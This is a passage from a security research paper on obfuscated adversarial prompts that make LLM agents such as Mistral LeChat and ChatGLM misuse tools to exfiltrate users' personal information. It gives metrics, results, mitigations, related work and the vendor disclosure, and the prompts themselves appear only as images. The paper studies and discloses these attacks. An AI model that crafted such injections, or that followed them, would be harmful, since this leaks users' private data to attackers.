MD Img \SetCell[r=2]c T9 \SetCell[r=2]l,m ![[Uncaptioned image]](img/8b4e3f511065c62a6041f4b6e72a208f.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/27ecefe6acb319d472c7e717ccea1e57.png) \SetCell[r=2]c 128
$\downarrow$
1905 \SetCell[r=2]c 77.2
$\downarrow$
97.2 \SetCell[r=2]c 54.3 \SetCell[r=2]c 30.1 \SetCell[r=2]c 94.8 \SetCell[r=2]c 44

\SetCell[r=2]c T10 \SetCell[r=2]l,m ![[Uncaptioned image]](img/8bcafc319b4398ec26e0c91205859250.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/0f1b0e6b02dcadd4855c47b8b9c2625e.png) \SetCell[r=2]c 2170
$\downarrow$
7489 \SetCell[r=2]c 0
$\downarrow$
100 \SetCell[r=2]c 79.8 \SetCell[r=2]c 47.0 \SetCell[r=2]c 75.2 \SetCell[r=2]c 16

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N6 \SetCell[r=2,c=2]l,m,10.2cm ![[Uncaptioned image]](img/9a96c8f2f706189c483c8b62ee74b7e5.png) \SetCell[r=2]c,m \SetCell[r=2]c 110 \SetCell[r=2]c 40.0 \SetCell[r=2]c 85.4 \SetCell[r=2]c 51.0 \SetCell[r=2]c 46.8 \SetCell[r=2]c -

\SetCell[r=4,c=2]c GLM4
MD Img \SetCell[r=2]c T11 \SetCell[r=2]l,m ![[Uncaptioned image]](img/16e3e2c2641fc8b6d04ca0afad6c2958.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/4facdd0446b04dd906c13d2f0f5092f4.png) \SetCell[r=2]c 3237
$\downarrow$
15877 \SetCell[r=2]c 17.2
$\downarrow$
92.0 \SetCell[r=2]c 48.1 \SetCell[r=2]c 22.0 \SetCell[r=2]c 48.0 \SetCell[r=2]c 20

\SetCell[r=2]c T12 \SetCell[r=2]l,m ![[Uncaptioned image]](img/acc35408d8f2ba921b4a6078228f83c0.png) \SetCell[r=2]c,m ![[Uncaptioned image]](img/c4669aa8d23a95da4ba1b95981ef8422.png) \SetCell[r=2]c 5361
$\downarrow$
14120 \SetCell[r=2]c 9.2
$\downarrow$
90.1 \SetCell[r=2]c 39.3 \SetCell[r=2]c 16.8 \SetCell[r=2]c 56.0 \SetCell[r=2]c 19

\SetCell[r=2]r Manual Prompt \SetCell[r=2]c N6 \SetCell[r=2,c=2]l,m,10.2cm ![[Uncaptioned image]](img/af6102116a6e1f9a88217548e3263808.png) \SetCell[r=2]c,m \SetCell[r=2]c 110 \SetCell[r=2]c 52 \SetCell[r=2]c 71.7 \SetCell[r=2]c 61.0 \SetCell[r=2]c 46.6 \SetCell[r=2]c - 

#### Metrics.

For the PII Exfiltration attack objective, we reuse the Perplexity and Syntax Correctness metrics mentioned above and add three PII-oriented metrics as follows:

1.  (1)

    PII Precision Rate — the ratio of terms in the extraction that are truly PII mentioned in the conversations to all terms in the extraction. This metric is a pessimistic estimate of how accurate the extraction because the attack requires extracting not only PII but also context. These context terms will mistakenly decrease this metric. For example, “John Doe, +1 888-88-8888, Applying for US VISA” versus a ground truth PII “John Doe, +1 888-88-8888” gives a precision score of $2/3$ since the last term is not in the ground truth even though it’s a useful context. Let alone that it is infeasible to exhaust all possible context terms as ground truth for the exact match.

2.  (2)

    PII Recall Rate — the ratio of the number of correct PII terms in the extraction payload to the total number of ground truth PII mentioned in the conversations. It reflects the completeness of the PII extracted. Though we do not expect the attack to extract all PII completely, it is still relevant since the more complete the extraction is, the easier it is for the attacker to identify the person.

3.  (3)

    Context GPT Score — whether GPT-4-o believes that the payload contains some helpful context that could help identify the intention of the person or the subject of the conversation (prompt presented in Appendix [A.2](https://arxiv.org/html/2410.14923v2#A1.SS2 "A.2\. Prompt List ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")). (This is always False when the syntax is incorrect.) This metric provides an estimate of the quality of the context extracted. Since this is a relatively subjective metric, we regard it as a secondary reference.

Again, Syntax Correctness is of the highest priority, and the three new metrics follow the above order. Also, we want to emphasize that PII Recall and Precision Rate are only computed on extractions when the tool invocation syntax is correct. We compute them on each conversation in the dataset and report the averaged result across all conversations.

#### Results on the Local LLM.

We ran our optimization method on the training dataset under various optimization settings. We again present a few best-performing prompts from different optimization settings and their evaluation results on the validation set (25 conversations) in Table [5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). We find a similar pattern as in the Information Exfiltration Attack.

Our adversarial examples are effective in exfiltrating PII on local text LLMs. We can see that all text prompts we present show a high syntax correctness rate (¿ 90% and even close to 100%) and high perplexity in the meantime (much better than the natural language instructions and initial prompts). T10 is more obfuscated than T9 in terms of perplexity, showcasing initializing with a less obfuscated optimized prompt can help enhance obfuscation as described in Section [4.1](https://arxiv.org/html/2410.14923v2#S4.SS1.SSS0.Px3 "Obfuscation. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). The absolute value of PII Precision Rate at around 80% of T10 shows a very strong performance considering that such metric is a lower bound estimate due to the issues mentioned above. A near 50% PII Recall Rate indicates that half of the PII was extracted on an average case, which is quite satisfactory given that there is an average of 7.4 PII info provided per conversation in the validation set. T11 and T12 for GLM4 do not perform as well in extracting PII but still successfully extract some PII.

#### Results on the Real Product.

We evaluated the best-performing text prompts for PII Exfiltration overall, T10 on Mistral LeChat Nemo and T12 and T13 on ChatGLM, with the same validation set and one single inference for each of them. We also tested the corresponding natural language instruction N6\. The result is presented in Table [6](https://arxiv.org/html/2410.14923v2#S5.T6 "Table 6 ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

Table 6. PII Exfiltration Attack on Real Products. Evaluation results of best-performing (in the corresponding attack setting) adversarial prompts from Table [5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") on LeChat and ChatGLM compared to manual prompts.

 Agent ID Syntax Correct % PII Prec. % PII Recall % Context GPT % Mistral LeChat Nemo T10 100 70.4 41.2 88.0 N6 44.0 80.2 48.2 36.0 ChatGLM T11 96.0 0.0 0.0 0.0 T12 92.0 34.7 63.0 88.0 N6 40.0 89.1 48.1 100 

Our adversarial textual prompt transfers to black-box real-world LLM agents for the PII Exfiltration task. We can see that our attack was effective. Syntax was correctly generated almost all the time (¿ 90%), which aligns with the performance in local tests. For T10, The PII Precision Rate, Context GPT Score, and PII Recall Rate are on par with the results in local evaluations and reflect a satisfactory performance. Interestingly, T11 doesn’t extract any useful PII on the real product ChatGLM — it always extracts a single term which is part of the prompt. In contrast, T12 performs much better on the real product compared to the local test. We suspect that the actual model behind ChatGLM may be much larger than and substantially different from the GLM4-9B model we are attacking locally (unlike Mistral Nemo) and may lead to this mismatched performance.

We were also curious about how our prompt T10 designed for PII Exfiltration Attack would work when the conversation has no PII information at all. We therefore evaluated T10 with the validation dataset from the Information Exfiltration setting which are general conversations. Results are in Table [3](https://arxiv.org/html/2410.14923v2#S5.T3 "Table 3 ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). Observe that the syntax rate is still high (90%). The extraction is less precise, which is expected due to missing PII in the conversation.

#### What happens when the attacks fail?

Looking at the failed attempts (where syntax correctness is not satisfied) on Mistral LeChat and ChatGLM for both attack objectives, we find the agent mostly responds with a list of keywords in plaintext with no tool invocation syntax when it fails. Occasionally, the agent may respond with the correct target string but wrapped in a markdown code block. This can be potentially mitigated by setting explicitly no code block in the optimization initialization as in T5\. In rare cases, the agent responds with some random irrelevant content.

## 6\. Discussion & Limitations

#### Potential Mitigations.

Some LLM agents adopt the conservative strategy of only allowing a very limited set of tools (e.g., Meta.ai only interfaces with Wolfram Alpha and only searches for information on a static set of websites). Restricting tool use can help protect against the attacks we present in this paper, however, such restrictions limit the usability of LLM agents and therefore may be a poor longer-term choice. Another mitigation approach is to filter out high-perplexity inputs in an attempt to reject potential obfuscated prompts (Menear, [2024](https://arxiv.org/html/2410.14923v2#bib.bib32)). This method may not be reliable, however, as previous work has shown that it is possible to create low perplexity prompts that are still obfuscated to humans (Kuribayashi et al., [2021](https://arxiv.org/html/2410.14923v2#bib.bib21)). Similarly, high-perplexity inputs do not necessarily imply adversarial obfuscation. For example, prior work has also shown that automatically tuned prompts that serve benign purposes can be high-perplexity (Melamed et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib31)).

#### Open-weights access vs. Black-box.

The success of our attack relies on the transferability of adversarial examples from open-weight LLMs to corresponding proprietary closed-weight LLMs. For the proprietary LLMs we attacked, we were able to find sufficiently nearby open-weight LLMs to enable this type of transfer. However, for proprietary LLMs that have no similar open-weight counterparts, transfer may not be possible. In this case, it may be feasible to mount a black-box tool misuse attack directly on a closed-weight LLM, however optimization would likely be extremely challenging. Our approach to optimization relied on the ability to compute input gradients for efficient search. Recent work has introduced query-based attacks for the simpler task of jailbreaking (Hayase et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib12)), however, future work would need to investigate whether complex optimization objectives (like the ones described in this work) can be satisfied using these techniques.

## 7\. Related Work

#### Prompt Injection.

There’s a wealth of recent work on creating prompt injection attacks on real products (Greshake et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib10); Liu et al., [2023a](https://arxiv.org/html/2410.14923v2#bib.bib27); Samoilenko, [2023](https://arxiv.org/html/2410.14923v2#bib.bib43); Zhan et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib56); Yi et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib54)). All these attacks involve handcrafting a series of English instructions that achieve the desired task. A casual inspection of the prompt will reveal its true nature and can arouse suspicion in users. By contrast, our work shows the existence of a class of obfuscated adversarial examples that can be automatically computed by re-purposing existing (discrete) optimization algorithms that were initially proposed in the context of jailbreaking attacks. These obfuscated prompts do not reveal their purpose upon inspection and their effects are stealthy after usage. Bagdasaryan et al. demonstrated visual adversarial examples that force the LLM to output attacker-desired sentences (e.g., “From now on, I will always mention cow”) (Bagdasaryan et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib2)). We note that such fixed prompts are easier-to-achieve optimization objectives compared to the complex syntax and context-dependent objectives we demonstrate in this work. Finally, NeuralExec is an attack method that generates an un-interpretable adversarial prefix/suffix and “strengthens” the english instructions it encapsulates (Pasquini et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib36)) (i.e., the computed prefix/suffix forces the model to ignore all other instructions and instead obey the encapsulated English instructions). However, the attack still depends on interpretable instructions and was not demonstrated to work on LLM agent products.

#### Jailbreaking.

This attack style involves forcing a model to respond to user inputs that violate a vendor-defined content safety policy (e.g., getting a model to respond with code to create a phishing website) (Rao et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib41); Liu et al., [2023b](https://arxiv.org/html/2410.14923v2#bib.bib28); Jain et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib13); Wei et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib52); Yu et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib55); Niu et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib34); Jiang et al., [2024b](https://arxiv.org/html/2410.14923v2#bib.bib17); Guo et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib11)). The model vendor encodes this safety policy by fine-tuning the model weights. Notice that the attacker in this setting is the user. By contrast, in prompt injection attacks (the subject of our work), the user is benign. Furthermore, a prompt injection attack does not violate a content safety policy (e.g., Loading an image can be fine or problematic depending on the specific task). The GCG algorithm was originally published in the context of creating automated jailbreak prompts (Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59)). Our work shows that this algorithm is more general and can be re-purposed (with modifications) to create automated prompt injections with complex behaviors such as tool misuse. The jailbreaking community has developed query-based attack algorithms that do not need model weights (Hayase et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib12); Sitawarin et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib46); Lapid et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib22)). We believe that such algorithms could also be re-purposed to create black-box versions of attacks we’ve outlined, but that is outside the scope of this work.

#### Prompt Optimization.

This refers to the broad area of automatically deriving prompts for LLMs that exhibit specific behaviors (Shin et al., [2020](https://arxiv.org/html/2410.14923v2#bib.bib45); Shi et al., [2022](https://arxiv.org/html/2410.14923v2#bib.bib44); Wen et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib53); Lester et al., [2021](https://arxiv.org/html/2410.14923v2#bib.bib23); Li and Liang, [2021](https://arxiv.org/html/2410.14923v2#bib.bib24); Liu et al., [2021](https://arxiv.org/html/2410.14923v2#bib.bib26); Qin et al., [2022](https://arxiv.org/html/2410.14923v2#bib.bib39)). They utilize a range of techniques including gradient information, search, and reinforcement learning. Unlike computer security tasks, these techniques were invented for the purpose of more effectively instructing LLMs to achieve user tasks. GCG, and our work building on it, demonstrates the dual nature of these techniques — they can be re-purposed to create attacks. This dual nature traces its roots to early work in adversarial machine learning where attackers could simply re-use gradient-based optimization to create attacks (Jang et al., [2017](https://arxiv.org/html/2410.14923v2#bib.bib14)).

## 8\. Conclusion

Agent-based systems that deeply integrate generative machine learning with tools to help users achieve realistic tasks have the potential to cause a paradigm shift in personal computing. We contributed to the security foundations of this emerging area by surfacing a new class of obfuscated adversarial examples along with the automated techniques to create those prompts. Based on a range of experiments with production-level agents and local models, these adversarial examples reliably misuse tools to leak personal information. Given the recent trend of sharing optimized prompts online for benign purposes, much like we share apps online today, it is likely that malicious prompts could be shared and mistakenly used as well, just as malware is shared.

## Acknowledgements

We thank Stefan Savage and Geoff Voelker for their suggestions on the naming of this paper. We thank Niloofar Mireshghallah for guiding us through the dataset in her work.

## Disclosure and Response

We initiated disclosure to Mistral and ChatGLM team on Sep 9, 2024, and Sep 18, 2024, respectively. Mistral team members responded promptly and acknowledged the vulnerability as a medium-severity issue. They fixed the data exfiltration by disabling markdown rendering of external images on Sep 13, 2024.⁹⁹9Check changelog on Sep 13, 2024 at [https://docs.mistral.ai/getting-started/changelog/.](https://docs.mistral.ai/getting-started/changelog/.) We confirmed that the fix works. At the time of writing, the ChatGLM team just informed us that they have begun working on it, after several attempts to reach them via various channels.^(10)^(10)10[https://github.com/THUDM/GLM-4/issues/592](https://github.com/THUDM/GLM-4/issues/592)

## References

*   (1)
*   Bagdasaryan et al. (2023) Eugene Bagdasaryan, Tsung-Yin Hsieh, Ben Nassi, and Vitaly Shmatikov. 2023. (Ab)using Images and Sounds for Indirect Instruction Injection in Multi-Modal LLMs. arXiv:2307.10490 [cs.CR]
*   Bengio et al. (2000) Yoshua Bengio, Réjean Ducharme, and Pascal Vincent. 2000. A neural probabilistic language model. *Advances in neural information processing systems* 13 (2000).
*   Beyer et al. (2024) Lucas Beyer, Andreas Steiner, André Susano Pinto, Alexander Kolesnikov, Xiao Wang, Daniel Salz, Maxim Neumann, Ibrahim Alabdulmohsin, Michael Tschannen, Emanuele Bugliarello, et al. 2024. PaliGemma: A versatile 3B VLM for transfer. *arXiv preprint arXiv:2407.07726* (2024).
*   Dubey et al. (2024) Abhimanyu Dubey, Abhinav Jauhri, Abhinav Pandey, Abhishek Kadian, Ahmad Al-Dahle, Aiesha Letman, Akhil Mathur, Alan Schelten, Amy Yang, Angela Fan, et al. 2024. The llama 3 herd of models. *arXiv preprint arXiv:2407.21783* (2024).
*   Fourrier et al. (2024) Clémentine Fourrier, Nathan Habib, Alina Lozovskaya, Konrad Szafer, and Thomas Wolf. 2024. Open LLM Leaderboard v2. [https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard](https://huggingface.co/spaces/open-llm-leaderboard/open_llm_leaderboard).
*   Fu et al. (2023) Xiaohan Fu, Zihan Wang, Shuheng Li, Rajesh K Gupta, Niloofar Mireshghallah, Taylor Berg-Kirkpatrick, and Earlence Fernandes. 2023. Misusing tools in large language models with visual adversarial examples. *arXiv preprint arXiv:2310.03185* (2023).
*   GLM et al. (2024) Team GLM, Aohan Zeng, Bin Xu, Bowen Wang, Chenhui Zhang, Da Yin, Diego Rojas, Guanyu Feng, Hanlin Zhao, Hanyu Lai, et al. 2024. ChatGLM: A Family of Large Language Models from GLM-130B to GLM-4 All Tools. *arXiv preprint arXiv:2406.12793* (2024).
*   Goodfellow et al. (2014) Ian J Goodfellow, Jonathon Shlens, and Christian Szegedy. 2014. Explaining and harnessing adversarial examples. *arXiv preprint arXiv:1412.6572* (2014).
*   Greshake et al. (2023) Kai Greshake, Sahar Abdelnabi, Shailesh Mishra, Christoph Endres, Thorsten Holz, and Mario Fritz. 2023. Not what you’ve signed up for: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection. arXiv:2302.12173 [cs.CR]
*   Guo et al. (2024) Xingang Guo, Fangxu Yu, Huan Zhang, Lianhui Qin, and Bin Hu. 2024. Cold-attack: Jailbreaking llms with stealthiness and controllability. *arXiv preprint arXiv:2402.08679* (2024).
*   Hayase et al. (2024) Jonathan Hayase, Ema Borevkovic, Nicholas Carlini, Florian Tramèr, and Milad Nasr. 2024. Query-based adversarial prompt generation. *arXiv preprint arXiv:2402.12329* (2024).
*   Jain et al. (2023) Neel Jain, Avi Schwarzschild, Yuxin Wen, Gowthami Somepalli, John Kirchenbauer, Ping yeh Chiang, Micah Goldblum, Aniruddha Saha, Jonas Geiping, and Tom Goldstein. 2023. Baseline Defenses for Adversarial Attacks Against Aligned Language Models. arXiv:2309.00614 [cs.LG]
*   Jang et al. (2017) Uyeong Jang, Xi Wu, and Somesh Jha. 2017. Objective metrics and gradient descent algorithms for adversarial examples in machine learning. In *Proceedings of the 33rd Annual Computer Security Applications Conference*. 262–277.
*   Jiang et al. (2023) Albert Q Jiang, Alexandre Sablayrolles, Arthur Mensch, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Florian Bressand, Gianna Lengyel, Guillaume Lample, Lucile Saulnier, et al. 2023. Mistral 7B. *arXiv preprint arXiv:2310.06825* (2023).
*   Jiang et al. (2024a) Albert Q Jiang, Alexandre Sablayrolles, Antoine Roux, Arthur Mensch, Blanche Savary, Chris Bamford, Devendra Singh Chaplot, Diego de las Casas, Emma Bou Hanna, Florian Bressand, et al. 2024a. Mixtral of experts. *arXiv preprint arXiv:2401.04088* (2024).
*   Jiang et al. (2024b) Fengqing Jiang, Zhangchen Xu, Luyao Niu, Zhen Xiang, Bhaskar Ramasubramanian, Bo Li, and Radha Poovendran. 2024b. Artprompt: Ascii art-based jailbreak attacks against aligned llms. *arXiv preprint arXiv:2402.11753* (2024).
*   Jin et al. (2024) Hanlei Jin, Yang Zhang, Dan Meng, Jun Wang, and Jinghua Tan. 2024. A comprehensive survey on process-oriented automatic text summarization with exploration of llm-based methods. *arXiv preprint arXiv:2403.02901* (2024).
*   Kapoor et al. (2024) Sayash Kapoor, Benedikt Stroebl, Zachary S. Siegel, Nitya Nadgir, and Arvind Narayanan. 2024. AI Agents That Matter. arXiv:2407.01502 [cs.LG] [https://arxiv.org/abs/2407.01502](https://arxiv.org/abs/2407.01502)
*   Kingma and Ba (2014) Diederik P Kingma and Jimmy Ba. 2014. Adam: A method for stochastic optimization. *arXiv preprint arXiv:1412.6980* (2014).
*   Kuribayashi et al. (2021) Tatsuki Kuribayashi, Yohei Oseki, Takumi Ito, Ryo Yoshida, Masayuki Asahara, and Kentaro Inui. 2021. Lower perplexity is not always human-like. *arXiv preprint arXiv:2106.01229* (2021).
*   Lapid et al. (2023) Raz Lapid, Ron Langberg, and Moshe Sipper. 2023. Open sesame! universal black box jailbreaking of large language models. *arXiv preprint arXiv:2309.01446* (2023).
*   Lester et al. (2021) Brian Lester, Rami Al-Rfou, and Noah Constant. 2021. The power of scale for parameter-efficient prompt tuning. *arXiv preprint arXiv:2104.08691* (2021).
*   Li and Liang (2021) Xiang Lisa Li and Percy Liang. 2021. Prefix-tuning: Optimizing continuous prompts for generation. *arXiv preprint arXiv:2101.00190* (2021).
*   Liu et al. (2024) Tong Liu, Zhe Zhao, Yinpeng Dong, Guozhu Meng, and Kai Chen. 2024. Making them ask and answer: Jailbreaking large language models in few queries via disguise and reconstruction. In *33rd USENIX Security Symposium (USENIX Security 24)*. 4711–4728.
*   Liu et al. (2021) Xiao Liu, Kaixuan Ji, Yicheng Fu, Weng Lam Tam, Zhengxiao Du, Zhilin Yang, and Jie Tang. 2021. P-tuning v2: Prompt tuning can be comparable to fine-tuning universally across scales and tasks. *arXiv preprint arXiv:2110.07602* (2021).
*   Liu et al. (2023a) Yi Liu, Gelei Deng, Yuekang Li, Kailong Wang, Zihao Wang, Xiaofeng Wang, Tianwei Zhang, Yepang Liu, Haoyu Wang, Yan Zheng, et al. 2023a. Prompt Injection attack against LLM-integrated Applications. *arXiv preprint arXiv:2306.05499* (2023).
*   Liu et al. (2023b) Yi Liu, Gelei Deng, Zhengzi Xu, Yuekang Li, Yaowen Zheng, Ying Zhang, Lida Zhao, Tianwei Zhang, Kailong Wang, and Yang Liu. 2023b. Jailbreaking chatgpt via prompt engineering: An empirical study. *arXiv preprint arXiv:2305.13860* (2023).
*   Martinc et al. (2021) Matej Martinc, Senja Pollak, and Marko Robnik-Šikonja. 2021. Supervised and unsupervised neural approaches to text readability. *Computational Linguistics* 47, 1 (2021), 141–179.
*   Maus et al. (2023) Natalie Maus, Patrick Chao, Eric Wong, and Jacob Gardner. 2023. Adversarial Prompting for Black Box Foundation Models. *arXiv* (2023).
*   Melamed et al. (2024) Rimon Melamed, Lucas H. McCabe, Tanay Wakhare, Yejin Kim, H. Howie Huang, and Enric Boix-Adsera. 2024. Prompt have evil twins. arXiv:2311.07064 [cs.CL] [https://arxiv.org/abs/2311.07064](https://arxiv.org/abs/2311.07064)
*   Menear (2024) Harry Menear. 2024. Jailbreaking large language models: How it’s done and how to stop it.
*   Mireshghallah et al. (2024) Niloofar Mireshghallah, Maria Antoniak, Yash More, Yejin Choi, and Golnoosh Farnadi. 2024. Trust No Bot: Discovering Personal Disclosures in Human-LLM Conversations in the Wild. *arXiv preprint arXiv:2407.11438* (2024).
*   Niu et al. (2024) Zhenxing Niu, Haodong Ren, Xinbo Gao, Gang Hua, and Rong Jin. 2024. Jailbreaking attack against multimodal large language model. *arXiv preprint arXiv:2402.02309* (2024).
*   OpenAI (2023) OpenAI. 2023. GPT-4 Technical Report. *CoRR* abs/2303.08774 (2023). [https://doi.org/10.48550/arXiv.2303.08774](https://doi.org/10.48550/arXiv.2303.08774) arXiv:2303.08774
*   Pasquini et al. (2024) Dario Pasquini, Martin Strohmeier, and Carmela Troncoso. 2024. Neural Exec: Learning (and Learning from) Execution Triggers for Prompt Injection Attacks. *arXiv preprint arXiv:2403.03792* (2024).
*   Patil et al. (2023) Shishir G Patil, Tianjun Zhang, Xin Wang, and Joseph E Gonzalez. 2023. Gorilla: Large language model connected with massive apis. *arXiv preprint arXiv:2305.15334* (2023).
*   Porter (2001) Martin F Porter. 2001. Snowball: A language for stemming algorithms.
*   Qin et al. (2022) Lianhui Qin, Sean Welleck, Daniel Khashabi, and Yejin Choi. 2022. Cold decoding: Energy-based constrained text generation with langevin dynamics. *Advances in Neural Information Processing Systems* 35 (2022), 9538–9551.
*   Qin et al. (2023) Yujia Qin, Shihao Liang, Yining Ye, Kunlun Zhu, Lan Yan, Yaxi Lu, Yankai Lin, Xin Cong, Xiangru Tang, Bill Qian, et al. 2023. Toolllm: Facilitating large language models to master 16000+ real-world apis. *arXiv preprint arXiv:2307.16789* (2023).
*   Rao et al. (2023) Abhinav Rao, Sachin Vashistha, Atharva Naik, Somak Aditya, and Monojit Choudhury. 2023. Tricking llms into disobedience: Understanding, analyzing, and preventing jailbreaks. *arXiv preprint arXiv:2305.14965* (2023).
*   Rehberger (2023) Johann Rehberger. 2023. AI Injections: Direct and Indirect Prompt Injections and Their Implications. [https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/](https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/).
*   Samoilenko (2023) Roman Samoilenko. 2023. New prompt injection attack on ChatGPT web version. Markdown images can steal your chat data.
*   Shi et al. (2022) Weijia Shi, Xiaochuang Han, Hila Gonen, Ari Holtzman, Yulia Tsvetkov, and Luke Zettlemoyer. 2022. Toward Human Readable Prompt Tuning: Kubrick’s The Shining is a good movie, and a good prompt too? *arXiv preprint arXiv:2212.10539* (2022).
*   Shin et al. (2020) Taylor Shin, Yasaman Razeghi, Robert L Logan IV, Eric Wallace, and Sameer Singh. 2020. Autoprompt: Eliciting knowledge from language models with automatically generated prompts. *arXiv preprint arXiv:2010.15980* (2020).
*   Sitawarin et al. (2024) Chawin Sitawarin, Norman Mu, David Wagner, and Alexandre Araujo. 2024. Pal: Proxy-guided black-box attack on large language models. *arXiv preprint arXiv:2402.09674* (2024).
*   Taori et al. (2023) Rohan Taori, Ishaan Gulrajani, Tianyi Zhang, Yann Dubois, Xuechen Li, Carlos Guestrin, Percy Liang, and Tatsunori B. Hashimoto. 2023. Stanford Alpaca: An Instruction-following LLaMA model. [https://github.com/tatsu-lab/stanford_alpaca](https://github.com/tatsu-lab/stanford_alpaca).
*   Team et al. (2023) Gemini Team, Rohan Anil, Sebastian Borgeaud, Yonghui Wu, Jean-Baptiste Alayrac, Jiahui Yu, Radu Soricut, Johan Schalkwyk, Andrew M Dai, Anja Hauth, et al. 2023. Gemini: a family of highly capable multimodal models. *arXiv preprint arXiv:2312.11805* (2023).
*   Team et al. (2024) Gemma Team, Morgane Riviere, Shreya Pathak, Pier Giuseppe Sessa, Cassidy Hardin, Surya Bhupatiraju, Léonard Hussenot, Thomas Mesnard, Bobak Shahriari, Alexandre Ramé, et al. 2024. Gemma 2: Improving open language models at a practical size. *arXiv preprint arXiv:2408.00118* (2024).
*   Team (2024) The Mistral AI Team. 2024. Mistral-Nemo-Base-2407. [https://huggingface.co/mistralai/Mistral-Nemo-Base-2407](https://huggingface.co/mistralai/Mistral-Nemo-Base-2407).
*   Wang et al. (2004) Zhou Wang, Alan C Bovik, Hamid R Sheikh, and Eero P Simoncelli. 2004. Image quality assessment: from error visibility to structural similarity. *IEEE transactions on image processing* 13, 4 (2004), 600–612.
*   Wei et al. (2023) Alexander Wei, Nika Haghtalab, and Jacob Steinhardt. 2023. Jailbroken: How Does LLM Safety Training Fail? arXiv:2307.02483 [cs.LG]
*   Wen et al. (2024) Yuxin Wen, Neel Jain, John Kirchenbauer, Micah Goldblum, Jonas Geiping, and Tom Goldstein. 2024. Hard prompts made easy: Gradient-based discrete optimization for prompt tuning and discovery. *Advances in Neural Information Processing Systems* 36 (2024).
*   Yi et al. (2023) Jingwei Yi, Yueqi Xie, Bin Zhu, Keegan Hines, Emre Kiciman, Guangzhong Sun, Xing Xie, and Fangzhao Wu. 2023. Benchmarking and defending against indirect prompt injection attacks on large language models. *arXiv preprint arXiv:2312.14197* (2023).
*   Yu et al. (2023) Jiahao Yu, Xingwei Lin, and Xinyu Xing. 2023. Gptfuzzer: Red teaming large language models with auto-generated jailbreak prompts. *arXiv preprint arXiv:2309.10253* (2023).
*   Zhan et al. (2024) Qiusi Zhan, Zhixiang Liang, Zifan Ying, and Daniel Kang. 2024. Injecagent: Benchmarking indirect prompt injections in tool-integrated large language model agents. *arXiv preprint arXiv:2403.02691* (2024).
*   Zhao et al. (2024) Wenting Zhao, Xiang Ren, Jack Hessel, Claire Cardie, Yejin Choi, and Yuntian Deng. 2024. WildChat: 1M ChatGPT Interaction Logs in the Wild. In *The Twelfth International Conference on Learning Representations*. [https://openreview.net/forum?id=Bl8u7ZRlbM](https://openreview.net/forum?id=Bl8u7ZRlbM)
*   Zheng et al. (2024) Lianmin Zheng, Wei-Lin Chiang, Ying Sheng, Siyuan Zhuang, Zhanghao Wu, Yonghao Zhuang, Zi Lin, Zhuohan Li, Dacheng Li, Eric Xing, et al. 2024. Judging llm-as-a-judge with mt-bench and chatbot arena. *Advances in Neural Information Processing Systems* 36 (2024).
*   Zou et al. (2023) Andy Zou, Zifan Wang, J. Zico Kolter, and Matt Fredrikson. 2023. Universal and Transferable Adversarial Attacks on Aligned Language Models. arXiv:2307.15043 [cs.CL]

